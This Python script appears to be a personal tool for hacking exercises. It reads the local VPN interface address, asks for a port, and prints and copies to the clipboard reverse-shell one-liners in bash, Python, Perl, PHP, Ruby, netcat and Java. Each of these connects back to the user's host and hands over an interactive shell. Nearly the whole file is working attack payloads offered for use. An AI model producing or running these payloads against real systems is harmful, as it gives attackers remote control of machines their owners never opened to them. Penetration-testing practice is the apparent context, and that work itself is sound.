#!/usr/bin/python3
import os
import sys
from time import sleep
import netifaces as ni
import pyperclip
from colorama import Fore,Style,Back

'''
ifconfig 
place the appropriate IP address and it's name here
For me, tun1 is what is given when I use openvpn for hacking
exercises
'''
ni.ifaddresses('tun1')
ip = ni.ifaddresses('tun1')[ni.AF_INET][0]['addr']
port = str("NULL")
    
def bash():
    print(Fore.WHITE+"\nbash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1\n")
    pyperclip.copy("bash -i >& /dev/tcp/"+ip+"/"+port +" 0>&1")
    spam = pyperclip.paste()

def python():
    print(Fore.WHITE+"\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'\n" %(ip,port))    
    pyperclip.copy("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" %(ip,port))
    spam = pyperclip.paste()

def perl():
    print(Fore.WHITE+"\nperl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" %(ip,port))
    pyperclip.copy("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ip,port))
    spam = pyperclip.paste()

def php():
    print(Fore.WHITE+"\nphp -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" %(ip,port))
    pyperclip.copy("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ip,port))
    spam = pyperclip.paste()

def ruby():
    print(Fore.WHITE+"\nruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'\n")
    pyperclip.copy("ruby -rsocket -e'f=TCPSocket.open("+ip+","+port+").to_i;exec sprintf("+"/bin/sh -i+"+"<&%d >&%d 2>&%d,f,f,f"+")'")
    spam = pyperclip.paste()

def netcat():
    print(Fore.WHITE+"\nnc -e /bin/sh %s %s\n" %(ip,port))
    pyperclip.copy("nc -e /bin/sh %s %s" %(ip,port))
    spam = pyperclip.paste()

def java():
    print(Fore.WHITE+'''\n\tr = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()'''"\n" %(ip,port))
    pyperclip.copy('''\tr = Runtime.getRuntime()
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
        p.waitFor()'''"" %(ip,port))
    spam = pyperclip.paste()


def main_menu():
    print("\n")
    print(Fore.RED +"["+Fore.GREEN+"1 ─╼ "+Fore.CYAN+"Bash"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"2 ─╼ "+Fore.CYAN+"Python"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"3 ─╼ "+Fore.CYAN+"Pearl"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"4 ─╼ "+Fore.CYAN+"PHP"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"5 ─╼ "+Fore.CYAN+"Ruby"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"6 ─╼ "+Fore.CYAN+"Netcat"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"7 ─╼ "+Fore.CYAN+"Java"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"8 ─╼ "+Fore.CYAN+"Change Port"+Fore.RED+"]")
    print(Fore.RED +"["+Fore.GREEN+"9 ─╼ "+Fore.CYAN+"Exit"+Fore.RED+"]\n")
    print(Style.BRIGHT+Fore.CYAN+"\nCurrent IP: "+Fore.RED+"───╼"+Fore.YELLOW+" # "+Fore.WHITE+
    "[ "+ip+" ]"+Fore.CYAN+"\nCurrent Port: "+Fore.RED+"───╼"+Fore.YELLOW+" # "+Fore.WHITE+"[ "+port+" ]" )
    choice = int(input(Style.BRIGHT+Fore.RED +"\n┌─["+Fore.CYAN+"Choose Shell Number"+Fore.RED+
    "]-" +Fore.RED +"["+Fore.GREEN+"~"+Fore.RED+"]"+Fore.RED+"\n└──────────╼"+Fore.GREEN+" # "))
    
    print_shell(choice)
def print_shell(choice):
    if choice == 1:
        {
            bash()
        }
    elif(choice == 2):
        {
            python()
        }
    elif(choice == 3):
        {
            perl()
        }
    elif(choice == 4):
        {
            php()
        }
    elif(choice == 5):
        {
            ruby()
        }
    elif(choice == 6):
        {
            netcat()
        }
    elif(choice == 7):
        {
             java()
        }

    elif(choice == 8):
        {
            change_port()
        }
    elif(choice == 9):
        {
            exit(0)
        }
    else:
        {
            print("\n\t\t[-]Wrong Choice")
            
        }
def change_port():
    global port
    port = input(Style.BRIGHT+Fore.RED +"\n┌─["+Fore.CYAN+"ENTER PORT NEW PORT:"+Fore.RED+
    "]-" +Fore.RED +"["+Fore.GREEN+"~"+Fore.RED+"]"+Fore.RED+"\n└──────────╼"+Fore.YELLOW+" # ")
    main_menu()


port = input(Style.BRIGHT+Fore.RED +"\n┌─["+Fore.CYAN+"ENTER PORT:"+Fore.RED+"]-" +Fore.RED +
"["+Fore.GREEN+"~"+Fore.RED+"]"+Fore.RED+"\n└──────────╼"+Fore.YELLOW+" # ")

main_menu()

